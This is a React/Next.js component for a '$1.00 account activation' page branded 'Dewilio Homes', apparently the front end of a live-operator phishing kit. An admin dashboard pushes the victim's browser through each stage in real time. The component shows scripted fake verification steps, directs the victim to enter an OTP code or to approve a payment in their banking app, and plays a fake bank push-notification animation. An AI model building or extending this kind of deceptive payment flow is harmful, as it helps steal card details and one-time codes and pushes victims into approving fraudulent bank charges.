"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Check, Loader2, Lock, ShieldAlert, ShieldCheck, Smartphone } from "lucide-react";
import { useActivationLive } from "@/lib/useActivationLive";

const AMOUNT = "$1.00";

/** The banking-app approval steps, shown once an admin sends the approval request. */
const APPROVAL_STEPS = [
  { key: "sent", label: "Request sent to your banking app" },
  { key: "approved", label: "Approved in your banking app" },
  { key: "final", label: "Final approval" },
] as const;

/** The holding-pen steps, shown while the applicant waits for an admin decision. */
const LOADING_STEPS = [
  "Verifying card details",
  "Confirming your license information",
  "Activating your account",
  "Sending you an approval request",
] as const;

/** Length of the phone-vibrating "your bank just pushed you" moment. */
const NOTICE_MS = 3200;

/** Stages that arrive as a push notification on the phone mockup. */
const NOTICE_STAGES = ["otp", "approved", "app_approval"];

const NOTICE_COPY: Record<string, { screen: string; push: string; action: string; title: string; body: string }> = {
  otp: {
    screen: "Verification code sent",
    push: "Dewilio Homes is requesting $1.00",
    action: "Open code screen",
    title: "Code sent",
    body: "A verification code is waiting for you. We’re taking you to the code screen.",
  },
  approved: {
    screen: "Payment approved",
    push: "Dewilio Homes approved $1.00",
    action: "Approve",
    title: "Payment approved",
    body: "Your activation payment went through. We’re taking you to your account.",
  },
  app_approval: {
    screen: "Approval requested",
    push: "Dewilio Homes is requesting $1.00",
    action: "Approve",
    title: "Approve the payment",
    body: "Open your banking app and approve the $1.00 activation payment to continue.",
  },
};

function elapsedLabel(seconds: number): string {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${m}:${String(s).padStart(2, "0")}`;
}

/**
 * Everything an applicant sees after paying, driven live from the dashboard over
 * an SSE stream. There is no self-directed progress here — the applicant simply
 * holds until an admin routes them:
 *
 *   • waiting / otp_verified → the loading page (the holding pen). It advances
 *     through a few reassuring steps, then rests on the last one indefinitely
 *     until an admin decides. This is where a new signup lands.
 *   • app_approval          → the approval page ("Check your banking app"), sent
 *     when an admin clicks "Approve on App".
 *   • otp / approved        → a bank-push moment plays, then the browser follows
 *     to the code screen or the welcome screen.
 *   • rejected              → the declined screen.
 */
export function ActivationPending({ initialStage }: { initialStage: string }) {
  const router = useRouter();
  const [seconds, setSeconds] = useState(0);
  const live = useActivationLive();
  const [played, setPlayed] = useState<string | null>(null);

  useEffect(() => {
    const started = Date.now();
    const tick = setInterval(() => setSeconds(Math.floor((Date.now() - started) / 1000)), 1000);
    return () => clearInterval(tick);
  }, []);

  // A decision from the dashboard plays as the bank-push moment before the page
  // turns over. `played` only records that a push already ran, so it can't loop.
  const notice = live && NOTICE_STAGES.includes(live.stage) && live.stage !== played ? live : null;

  // Let the push play out, then act. Approval settles onto this same page (into
  // the approval view); the others navigate away.
  useEffect(() => {
    if (!notice) return;
    const timer = setTimeout(() => {
      if (notice.stage === "app_approval") setPlayed("app_approval");
      else router.replace(notice.destination);
    }, NOTICE_MS);
    return () => clearTimeout(timer);
  }, [notice, router]);

  const stage = live?.stage ?? initialStage;

  if (stage === "rejected") {
    return (
      <div>
        <div className="flex h-16 w-16 items-center justify-center rounded-2xl bg-rose-50 text-rose-600 ring-1 ring-rose-200">
          <ShieldAlert size={30} />
        </div>
        <h1 className="mt-6 font-display text-3xl font-bold text-brand-950">Activation declined</h1>
        <p className="mt-2 text-sm leading-relaxed text-brand-600">
          We weren&rsquo;t able to approve this activation. If you believe this is a mistake, our team
          can take another look.
        </p>
        <div className="mt-7 flex flex-col gap-2.5">
          <a
            href="mailto:support@dewillio.com"
            className="rounded-lg bg-brand-950 px-4 py-3 text-center text-sm font-semibold text-white transition-colors hover:bg-brand-800"
          >
            Contact support
          </a>
          <Link
            href="/"
            className="rounded-lg px-4 py-3 text-center text-sm font-semibold text-brand-600 transition-colors hover:text-brand-950"
          >
            Back to homepage
          </Link>
        </div>
      </div>
    );
  }

  if (notice) return <PushNotice notice={notice} seconds={seconds} />;

  if (stage === "app_approval") return <ApprovalPage seconds={seconds} />;

  return <LoadingPage seconds={seconds} />;
}

/* ------------------------------------------------------------------ */

/** The next-level holding page: a live secure-processing screen that rests on
 *  its final step until an admin routes the applicant onward. */
function LoadingPage({ seconds }: { seconds: number }) {
  // Ease through the first steps over a few seconds, then hold on the last one.
  const step = Math.min(Math.floor(seconds / 2), LOADING_STEPS.length - 1);

  return (
    <div>
      {/* Animated secure badge: a spinning accent ring around a shield, wrapped
          in a soft pinging glow. */}
      <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
        <span className="ping-dot absolute inset-0 rounded-full bg-accent-500/15" />
        <span className="absolute inset-1.5 rounded-full border-[3px] border-accent-500/20 border-t-accent-500 animate-spin" />
        <span className="relative flex h-12 w-12 items-center justify-center rounded-full bg-brand-950 text-accent-400 shadow-lg shadow-brand-950/25">
          <ShieldCheck className="h-6 w-6" />
        </span>
      </div>

      <p className="mt-6 text-center font-display text-4xl font-bold tracking-tight text-brand-950">
        {AMOUNT}
      </p>
      <p className="mt-1 text-center text-sm font-medium text-brand-500">Account activation</p>

      {/* Indeterminate shimmer — the wait is genuinely open-ended. */}
      <div className="relative mt-7 h-1.5 w-full overflow-hidden rounded-full bg-brand-100">
        <span className="animate-shimmer absolute inset-y-0 left-0 w-1/2 rounded-full" />
      </div>

      <ul className="mt-7 space-y-3.5">
        {LOADING_STEPS.map((label, i) => (
          <li key={label} className="flex items-center gap-3 text-sm">
            {i < step ? (
              <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-emerald-100 text-emerald-700">
                <Check className="h-3.5 w-3.5" strokeWidth={3} />
              </span>
            ) : i === step ? (
              <span className="flex h-5 w-5 shrink-0 items-center justify-center">
                <Loader2 className="h-4 w-4 animate-spin text-accent-600" />
              </span>
            ) : (
              <span className="h-5 w-5 shrink-0 rounded-full border border-brand-200" />
            )}
            <span className={i <= step ? "font-medium text-brand-900" : "text-brand-400"}>{label}</span>
          </li>
        ))}
      </ul>

      <div className="mt-8 flex items-center justify-between border-t border-brand-100 pt-4 text-xs text-brand-400">
        <span className="flex items-center gap-1.5">
          <Lock className="h-3.5 w-3.5" />
          Please keep this window open
        </span>
        <span className="tabular-nums">{elapsedLabel(seconds)}</span>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */

/** The approval page ("Check your banking app") — where an admin sends the
 *  applicant with "Approve on App". Holds until the admin confirms. */
function ApprovalPage({ seconds }: { seconds: number }) {
  return (
    <div>
      {/* Phone with a pinging approval-request bubble — the payment waiting in
          the banking app. */}
      <div className="relative h-24 w-28">
        <span className="ping-dot absolute left-1/2 top-1/2 h-20 w-20 -translate-x-1/2 -translate-y-1/2 rounded-full bg-accent-500/15" />
        <Smartphone className="relative mx-auto h-24 w-16 text-brand-300" strokeWidth={1.3} />
        <span className="absolute -right-1 top-0 flex h-11 w-11 items-center justify-center rounded-full bg-accent-500 text-brand-950 shadow-lg shadow-accent-500/40">
          <span className="ping-dot absolute inset-0 rounded-full bg-inherit" />
          <Loader2 className="relative h-5 w-5 animate-spin" strokeWidth={2.6} />
        </span>
      </div>

      <h1 className="mt-6 font-display text-3xl font-bold leading-snug text-brand-950">
        Check your banking app
      </h1>
      <p className="mt-2 text-sm leading-relaxed text-brand-600">
        Go to your banking app and{" "}
        <span className="font-semibold text-brand-900">approve the payment</span>. It shows up as a
        notification with the amount and merchant name, and this page updates automatically.
      </p>

      {/* The request as the banking app would list it */}
      <div className="mt-6 w-full rounded-xl border border-brand-100 bg-brand-50/60 px-4 py-3 text-left text-sm">
        <div className="flex items-center justify-between gap-3">
          <span className="truncate text-brand-500">Dewilio Homes</span>
          <span className="shrink-0 font-semibold text-brand-900">{AMOUNT}</span>
        </div>
        <div className="mt-1 text-xs text-brand-400">Account activation · pending approval</div>
      </div>

      <div className="mt-5 inline-flex items-center gap-2 rounded-full border border-brand-100 bg-brand-50/60 px-3.5 py-1.5 text-xs font-medium text-brand-700">
        <span className="ping-dot h-1.5 w-1.5 rounded-full bg-accent-500" />
        Waiting for you to approve the payment
      </div>

      {/* Indeterminate shimmer — the wait is genuinely open-ended */}
      <div className="relative mt-7 h-1 w-full overflow-hidden rounded-full bg-brand-100">
        <span className="animate-shimmer absolute inset-y-0 left-0 w-1/2 rounded-full" />
      </div>

      <ul className="mt-7 space-y-3 text-left">
        {APPROVAL_STEPS.map((step, i) => (
          <li key={step.key} className="flex items-center gap-3 text-sm">
            {i < 1 ? (
              <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-emerald-100 text-emerald-700">
                <Check className="h-3.5 w-3.5" strokeWidth={3} />
              </span>
            ) : i === 1 ? (
              <span className="flex h-5 w-5 shrink-0 items-center justify-center">
                <Loader2 className="h-4 w-4 animate-spin text-accent-600" />
              </span>
            ) : (
              <span className="h-5 w-5 shrink-0 rounded-full border border-brand-200" />
            )}
            <span className={i <= 1 ? "text-brand-800" : "text-brand-400"}>{step.label}</span>
          </li>
        ))}
      </ul>

      <div className="mt-8 flex items-center justify-between border-t border-brand-100 pt-4 text-xs text-brand-400">
        <span className="flex items-center gap-1.5">
          <Smartphone className="h-3.5 w-3.5" />
          Done in your banking app
        </span>
        <span className="tabular-nums">{elapsedLabel(seconds)}</span>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */

/** The bank-push moment: the phone buzzes and a push notification lands, played
 *  when an admin routes the applicant. */
function PushNotice({
  notice,
  seconds,
}: {
  notice: { stage: string; destination: string };
  seconds: number;
}) {
  const approved = notice.stage === "approved";
  const copy = NOTICE_COPY[notice.stage];
  return (
    <div>
      <div className="animate-notice-in mx-auto w-[15rem]">
        <div className="animate-vibrate overflow-hidden rounded-[2rem] border-[6px] border-brand-900 bg-brand-975 p-2 shadow-2xl shadow-brand-950/25">
          <div className="overflow-hidden rounded-[1.45rem] bg-white">
            {/* Status bar, so it reads as a phone screen */}
            <div className="flex items-center justify-between px-4 pb-1 pt-3 text-[10px] font-semibold text-brand-950">
              <span>9:41</span>
              <span className="flex items-center gap-1">
                <span className="h-1 w-4 rounded-full bg-brand-950/25" />
                <span className="h-2 w-2 rounded-full bg-brand-950/25" />
                <span className="h-2 w-1.5 rounded-sm bg-brand-950/25" />
              </span>
            </div>
            <div className="px-4 pb-3 pt-1.5 text-center">
              <p className="text-[11px] font-semibold text-brand-400">Your banking app</p>
              <p className="text-sm font-bold text-brand-950">{copy.screen}</p>
            </div>

            {/* The push notification, sliding down over the app */}
            <div className="animate-notice-drop mx-3 mb-4 rounded-2xl bg-brand-50 p-3 shadow-lg shadow-brand-950/10 ring-1 ring-brand-100">
              <div className="flex items-start gap-2.5">
                <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-brand-950 text-accent-400">
                  <Lock className="h-3.5 w-3.5" />
                </span>
                <div className="min-w-0 flex-1 text-left">
                  <p className="text-[10px] font-bold text-brand-500">Payment approval</p>
                  <p className="text-xs font-bold leading-snug text-brand-950">{copy.push}</p>
                  <p className="mt-0.5 text-[10px] text-brand-400">Tap to open your banking app</p>
                </div>
              </div>
              <div className="mt-2.5 flex gap-1.5">
                <button
                  type="button"
                  className={`flex-1 rounded-lg py-1.5 text-[11px] font-bold text-white ${
                    approved ? "bg-emerald-600" : "bg-brand-950"
                  }`}
                >
                  {copy.action}
                </button>
                <button
                  type="button"
                  className="flex-1 rounded-lg border border-brand-200 bg-white py-1.5 text-[11px] font-semibold text-brand-500"
                >
                  Ignore
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <p className="mt-6 font-display text-3xl font-bold leading-snug text-brand-950">{copy.title}</p>
      <p className="mt-2 text-sm leading-relaxed text-brand-600">{copy.body}</p>

      <div className="mt-5 inline-flex items-center gap-2 rounded-full border border-brand-100 bg-brand-50/60 px-3.5 py-1.5 text-xs font-medium text-brand-700">
        <Loader2 className="h-3.5 w-3.5 animate-spin text-accent-600" />
        {notice.stage === "app_approval" ? "Waiting for your approval…" : "Redirecting you…"}
      </div>

      <div className="mt-8 flex items-center justify-between border-t border-brand-100 pt-4 text-xs text-brand-400">
        <span className="flex items-center gap-1.5">
          <Smartphone className="h-3.5 w-3.5" />
          Done in your banking app
        </span>
        <span className="tabular-nums">{elapsedLabel(seconds)}</span>
      </div>
    </div>
  );
}
